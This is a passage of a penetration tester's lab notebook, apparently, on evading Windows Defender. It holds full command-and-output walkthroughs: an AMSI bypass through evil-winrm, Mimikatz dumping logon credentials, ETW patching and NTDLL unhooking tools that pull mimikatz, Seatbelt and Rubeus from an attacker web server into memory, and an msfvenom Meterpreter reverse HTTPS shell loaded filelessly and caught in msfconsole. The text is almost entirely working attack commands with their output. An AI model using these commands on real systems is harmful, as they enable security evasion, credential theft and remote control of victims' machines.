------------------------------------------------------------------------------------------------------------------------------------------------

Test 1 - AMSI bypass with the tool evil-winrm running with a local admin account on a Windows 2016 server with Defender (AV) enabled and up-to-date
---------------------------------------------------------------------------------------------------------------------------------------------------

$ evil-winrm -u Administrator -p Test1234 -i 192.168.1.38 -s '/home/kali/Documents/'                                    

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> menu
The term 'Menu' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ Menu
+ ~~~~
    + CategoryInfo          : ObjectNotFound: (Menu:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit

Evil-WinRM* PS C:\Users\Administrator\Documents> systeminfo

Host Name:                 WIN-DV7MRN2F7E8
OS Name:                   Microsoft Windows Server 2016 Standard Evaluation
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00378-00000-00000-AA739
Original Install Date:     11/27/2021, 1:32:54 PM
System Boot Time:          11/27/2021, 5:03:20 PM
System Manufacturer:       innotek GmbH
System Model:              VirtualBox
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 142 Stepping 10 GenuineIntel ~1896 Mhz
BIOS Version:              innotek GmbH VirtualBox, 12/1/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              fr;French (France)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,048 MB
Available Physical Memory: 1,028 MB
Virtual Memory: Max Size:  3,200 MB
Virtual Memory: Available: 2,039 MB
Virtual Memory: In Use:    1,161 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\WIN-DV7MRN2F7E8
<SNIP>

*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-MpComputerStatus

AMEngineVersion                 : 1.1.18700.4
AMProductVersion                : 4.10.14393.0
AMServiceEnabled                : True
AMServiceVersion                : 4.10.14393.0
AntispywareEnabled              : True
AntispywareSignatureAge         : 0
AntispywareSignatureLastUpdated : 11/27/2021 8:25:18 AM
AntispywareSignatureVersion     : 1.353.1705.0
AntivirusEnabled                : True
AntivirusSignatureAge           : 0
AntivirusSignatureLastUpdated   : 11/27/2021 8:25:21 AM
AntivirusSignatureVersion       : 1.353.1705.0
BehaviorMonitorEnabled          : True
ComputerID                      : 118D02EB-A8E0-46AE-9437-9C89C2ABB59F
ComputerState                   : 0
FullScanAge                     : 4294967295
FullScanEndTime                 :
FullScanStartTime               :
IoavProtectionEnabled           : True
LastFullScanSource              : 0
LastQuickScanSource             : 0
NISEnabled                      : True
NISEngineVersion                : 2.1.14600.4
NISSignatureAge                 : 4294967295
NISSignatureLastUpdated         :
NISSignatureVersion             : 119.0.0.0
OnAccessProtectionEnabled       : True
QuickScanAge                    : 4294967295
QuickScanEndTime                :
QuickScanStartTime              :
RealTimeProtectionEnabled       : True
RealTimeScanDirection           : 0
PSComputerName                  :


*Evil-WinRM* PS C:\Users\Administrator\Documents> Bypass-4MSI

Warning: AV could be still watching for suspicious activity. Waiting for patching...

[+] Success!

*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Mimikatz.ps1
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Mimikatz

  .#####.   mimikatz 2.2.0 (x64) #19041 Jul 24 2021 11:00:11
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 40930 (00000000:00009fe2)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/27/2021 3:31:07 PM
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
         * Username : WIN-DV7MRN2F7E8$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

<SNIP>

=> It worked !


Test 2 - AMSI bypass with the tool evil-winrm running with a local admin account on a Windows 10 laptop with Defender (AV) enabled and up-to-date
-------------------------------------------------------------------------------------------------------------------------------------------------

┌──(kali㉿kali)-[~/Documents]
└─$ evil-winrm -u administrator -p 'Password123!' -i 192.168.1.35 -s '/home/kali/Documents/' -e '/home/kali/Documents/x64/'

Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> menu
The term 'Menu' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ Menu
[+] Dll-Loader 
[+] Donut-Loader 
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit

=> Note: Without disabling the AMSI, 'mimikatz.exe' and 'Invoke-Mimkatz.ps1' are detected and blocked by Windows Defender...

*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Binary /home/kali/Documents/x64/mimikatz.exe
At line:1 char:1
+ Invoke-Binary TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAA ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand

*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Mimikatz.ps1

*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Mimikatz
At line:1 char:1
+ Invoke-Mimikatz
+ ~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand


=> Note: Let's try the AMSI bypass feature of Evil-WinRM...

*Evil-WinRM* PS C:\Users\Administrator\Documents> Bypass-4MSI
[+] Success!

Error: An error of type WinRM::WinRMWSManFault happened, message is [WSMAN ERROR CODE: 1726]: 
<f:WSManFault Code='1726' Machine='192.168.1.35' xmlns:f='http://schemas.microsoft.com/wbem/wsman/1/wsmanfault'><f:Message>The WSMan provider host
process did not return a proper response.  A provider in the host process may have behaved improperly. </f:Message></f:WSManFault>
Error: Exiting with code 1
Error: Exiting with code 1

=> Note: The "Bypass-4MSI" feature is not working. It is detected by Windows Defender and the WinRM connection is shutdown.

Windows Defender messages
=========================

HackTool:Win32/Mikatz!dha
Alert level: High
Status: Active
Date: 23/11/2021 01:32
Category: Tool
Details: This program has potentially unwanted behaviour
Learn more
Affected items:
	amsi: \Device\HarddiskVolume3\Windows\System32\wsmprovhost.exe
	
Trojan:PowerShell/PSAttackTool.A
Alert level: Severe
Status: Active
Date: 23/11/2021 01:35
Category: Trojan
Details: This program is dangerous and executes commands from an attacker.
Learn more
Affected items:
	amsi: \Device\HarddiskVolume3\Windows\System32\wsmprovhost.exe


------------------------------------------------------------------------------------------------------------------------------------------------
4.5 Example of Living of the land on a Window server 2012 R2 with a basic AV installed and no AMSI
------------------------------------------------------------------------------------------------------------------------------------------------

Note:  Just for testing purposes, I installed the old and basic AV 'Microsoft Security Essentials' in compatibility mode on a Windows server 2012 R2.
       As expected, there is no AMSI and the basic AV (even with an updated signature database) does't not detect and nor block the PowerShell scripts
       directly loaded into memory.
       
┌──(kali㉿kali)-[~/Documents]
└─$ sudo evil-winrm -i 192.168.1.49 -u admin -p 'Adm1n2022' -s '/home/kali/Documents/' -e '/home/kali/Documents/'

Evil-WinRM shell v3.3
<SNIP>
*Evil-WinRM* PS C:\Users\admin\Documents> menu

   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (     '    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
[+] Dll-Loader 
[+] Donut-Loader 
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit

*Evil-WinRM* PS C:\Users\admin\Documents> 

*Evil-WinRM* PS C:\Users\admin\Documents> Invoke-Mimikatz.ps1

*Evil-WinRM* PS C:\Users\admin\Documents> Invoke-Mimikatz

  .#####.   mimikatz 2.2.0 (x64) #19041 Jul 24 2021 11:00:11
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 42854 (00000000:0000a766)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/21/2021 6:58:31 PM
SID               : S-1-5-90-1
	msv :
	 [00000003] Primary
	 * Username : SERVER03$
	 * Domain   : SECURITY-LAB
<SNIP>


===========================================================================================================================================================
V.  Examples of techniques to bypass AV products and to download and execute straight into memory any offensive Portable Executable (PE) files
    (without using PowerShell) 
===========================================================================================================================================================

-----------------------------------------------------------------------------------------------------------------------------------------------------------
5.1 Example of AV bypass (Fileless technique + ETW patching + NTDLL unhooking) using the tool 'FilelessRemotePE'  
-----------------------------------------------------------------------------------------------------------------------------------------------------------

=> Source: https://github.com/D1rkMtr/FilelessRemotePE

The tool "FilelessRemotePE" allows to load directly into memory remote Portable Executable (PE) files with:
> argument passing
> ETW patching
> NTDLL unhooking
> no new thread technique

Limitation: It runs only c/c++/asm based binaries.

Test/PoC 1 - Download and execute (in-memory) Mimikatz.exe on a Windows server 2016 without being detected nor blocked by the MS Defender AV (enabled and up-to-date)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

C:\Users\Administrator>powershell -exec bypass
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> Get-MpComputerStatus | Select AntivirusEnabled

AntivirusEnabled
----------------
            True

PS C:\temp> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL

RealTimeProtectionEnabled : True
IoavProtectionEnabled     : True
AntispywareEnabled        : True


PS C:\Users\Administrator> cmd
Microsoft Windows [Version 10.0.14393]
(c) Microsoft Corporation. All rights reserved.

c:\Users\Administrator> cd C:\temp
c:\temp>

c:\temp>remotepev1.exe

[+] Unhooking

[+] Patch ETW

[+] Enter the uri :
http://192.168.1.113:8080/mimikatz.exe

[+] Loading Remote PE from http://192.168.1.113:8080/mimikatz.exe

[+] Run PE

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 194073 (00000000:0002f619)
Session           : Interactive from 1
User Name         : Administrator
Domain            : ORACLESERVER1
Logon Server      : ORACLESERVER1
Logon Time        : 11/27/2022 7:10:57 PM
SID               : S-1-5-21-1644803877-2661921197-3301414406-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : ORACLESERVER1
         * NTLM     : cf3a5525ee9414229e66279623<SNIP>
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : ORACLESERVER1
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : ORACLESERVER1
         * Password : (null)
        ssp :
        credman :

<SNIP>

mimikatz # exit
Bye!


Test/PoC 2 - Download and execute (in-memory) a x64 Meterpreter reverse https shell on a Windows 10 without being detected nor blocked by the MS Defender AV (enabled and up-to-date)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

=> Step 1 - Generate a (x64) Meterpreter reverse https shell with msfvenom and host it on a web server
-------------------------------------------------------------------------------------------------------
jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem LHOST=192.168.1.30 LPORT=443 -a x64 -f exe -o meterpreter-x64-reverse-https.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 201308 bytes
Final size of exe file: 207872 bytes
Saved as: meterpreter-x64-reverse-https.exe

jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ python3 -m http.server 8080


=> Step 2 - Load directly into memory the (x64) Meterpreter reverse https shell using the tool "FilelessRemotePE" on the target Windows 10
-----------------------------------------------------------------------------------------------------------------------------------------
Microsoft Windows [Version 10.0.19044.2364]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator.PO718687\Documents\Tools-AD>echo  http://192.168.1.30:8080/Pivoting-with-MSF/meterpreter-x64-reverse-https.exe | RemotePEv1.exe

[+] Unhooking

[+] Patch ETW

[+] Enter the uri :
http://192.168.1.30:8080/Pivoting-with-MSF/meterpreter-x64-reverse-https.exe

[+] Loading Remote PE from http://192.168.1.30:8080/Pivoting-with-MSF/meterpreter-x64-reverse-https.exe

[+] Run PE


=> Step 3 - You have now a meterpreter shell running without being detected nor blocked by the MS Defender AV
--------------------------------------------------------------------------------------------------------------
jeff@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST 192.168.1.30; set LPORT 443; set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true; set HandlerSSLCert /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem;  run -j"
[sudo] password for jeff: 
[!] The following modules were loaded with warnings:
[!]     /usr/share/metasploit-framework/modules/encoders/x86/bf_xor.rb
[!] Please see /root/.msf4/logs/framework.log for details.
                                                  
       =[ metasploit v6.1.14-dev                          ]
+ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
+ -- --=[ 596 payloads - 46 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: To save all commands executed since start up 
to a file, use the makerc command

[*] Starting persistent handler(s)...
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/x64/meterpreter_reverse_https
LHOST => 192.168.1.30
LPORT => 443
EXITFUNC => thread
ExitOnSession => false
SessionCommunicationTimeout => 0
EnableUnicodeEncoding => true
HandlerSSLCert => /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

msf6 exploit(multi/handler) > 
msf6 exploit(multi/handler) > jobs -l

Jobs
====

  Id  Name                    Payload                                Payload opts
  --  ----                    -------                                ------------
  0   Exploit: multi/handler  windows/x64/meterpreter_reverse_https  https://192.168.1.30:443

msf6 exploit(multi/handler) > 
[!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: kplnlp8t) Without a database connected that payload UUID tracking will not work!
[*] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: kplnlp8t) Redirecting stageless connection from /NGLfszJmUfFG6kfoJXTfdwDbqpn2JFtkiVOXA5gTsBJ0C1GNjeKjMH031zX4BOdlup76N88hjiM6b6hmVS1Eiv1KbD1_PSXSFxw_e01g1B0UDvCuZlfEsluNJZxv with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
[!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: kplnlp8t) Without a database connected that payload UUID tracking will not work!
[*] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: kplnlp8t) Attaching orphaned/stageless session...
[!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: kplnlp8t) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 2 opened (192.168.1.30:443 -> 127.0.0.1 ) at 2022-12-18 05:39:59 +0100

msf6 exploit(multi/handler) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: Laptopwin10\Administrator

meterpreter > shell

Process 11948 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19044.2364]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Documents\Tools-AD>powershell -exec bypass
powershell -exec bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\Documents\Tools-AD> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL

RealTimeProtectionEnabled : True
IoavProtectionEnabled     : True
AntispywareEnabled        : True

PS C:\Users\Administrator\Documents\Tools-AD> 

<SNIP>


-----------------------------------------------------------------------------------------------------------------------------------------------------------
5.2 Example of AV bypass (Fileless technique + AMSI & ETW patching) using the tool 'ExecRemoteAssembly' 
-----------------------------------------------------------------------------------------------------------------------------------------------------------

=> Source: https://github.com/D1rkMtr/ExecRemoteAssembly

This tool allows to download and execute directly into memory a remote .Net assembly with:
> AMSI patching
> ETW patching
> arguments passing

Limitaion: it can only run .NET assemblies that are based on C#.

Reminder: 
- An assembly is a collection of types and resources that are built to work together and form a logical unit of functionality. 
- Assemblies take the form of executable (.exe) or dynamic link library (.dll) files, and are the building blocks of .NET applications.


Test/PoC - Download and execution in-memory of Seatbelt.exe on a Windows 10 with the MS Defender AV enabled and up-to-date
-----------------------------------------------------------------------------------------------------------------------------

PS C:\Users\Administrator\Documents\Tools-AD\ExecRemoteAssembly-main> .\ExecRemoteNET.exe http://192.168.1.113:8081/seatbelt.exe -group=remote
[-] Failed to load amsi.dll
[+] Patched etw!
[+] Patched amsi!
[+] Patched amsi open session!
 ~ Execute Remote .NET Assembly ~

[+] Loading Remote PE from http://192.168.1.113:8081/seatbelt.exe
[+] Bytes: 581632


                        %&&@@@&&
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
                        &%%&&&%%%%%        v1.0.0         ,(((&%%%%%%%%%%%%%%%%%,
                         #%%%%##,


====== AMSIProviders ======

  GUID                           : {2781761E-28E0-4109-99FE-B9D127C57AFE}
  ProviderPath                   : "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2211.5-0\MpOav.dll"

====== AntiVirus ======

  Engine                         : Windows Defender
  ProductEXE                     : windowsdefender://
  ReportingEXE                   : %ProgramFiles%\Windows Defender\MsMpeng.exe

====== DotNet ======

  Installed CLR Versions
      2.0.50727
      4.0.30319

  Installed .NET Versions
      3.5.30729.4926
      4.8.04084

  Anti-Malware Scan Interface (AMSI)
      OS supports AMSI           : False
     .NET version support AMSI   : True
        [!] The highest .NET version is enrolled in AMSI!
====== ExplorerRunCommands ======


  S-1-5-21-936125016-2310263949-2175806047-500 :
    a          :  cmd\1
    MRUList    :  akcmljifhgedb
    b          :  services\1
    c          :  mstsc\1
    d          :  powershell\1
    e          :  cmd.exe /c echo y\1
    f          :  cmd /k ipconfig\1
    g          :  gpedit.msc\1
    h          :  cmd ipconfig\1
    i          :  cmd /c ipconfig\1
    j          :  ipconfig\1
    k          :  notepad\1
    l          :  cmd /kipconfig\1
    m          :  calc\1
====== Hotfixes ======
<SNIP>


-----------------------------------------------------------------------------------------------------------------------------------------------------------
5.3 Example of AV bypass (Fileless technique + AMSI patching) using the tool 'EAPrimer'	
-----------------------------------------------------------------------------------------------------------------------------------------------------------

=> Source: https://github.com/m8sec/EAPrimer

The tool "EAPrimer" can be used to load .Net assemblies (C#) from a filepath (local directory) or a URL. 
On startup, it will attempt to perform in-memory patching of AMSI to bypass detection. 
By default, the output is written to the console, however, this can be directed to a file or even sent via HTTP POST request to a remote server.

Reminder: 
- An assembly is a collection of types and resources that are built to work together and form a logical unit of functionality. 
- Assemblies take the form of executable (.exe) or dynamic link library (.dll) files, and are the building blocks of .NET applications.


Test/PoC - Download and execution in-memory of Rubeus.exe on a Windows server 2016 without being detected nor blocked by the MS Defender AV (enabled and up-to-date)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>cd c:\temp

c:\temp>eaprimer.exe -path=http://192.168.1.113:8080/rubeus.exe
[*] EAPrimer v0.1.2
[*] Applying In-Memory Patch
[*] Loading Asembly: http://192.168.1.113:8080/rubeus.exe
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

 Ticket requests and renewals:

    Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:
        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap]

    Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap]
 <SNIP>

c:\temp>eaprimer.exe -path=http://192.168.1.113:8080/rubeus.exe -args=currentluid
[*] EAPrimer v0.1.2
[*] Applying In-Memory Patch
[*] Assembly Args: "currentluid"
[*] Loading Asembly: http://192.168.1.113:8080/rubeus.exe

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: Display current LUID

[*] Current LogonID (LUID) : 0x739b4 (473524)

 <SNIP>

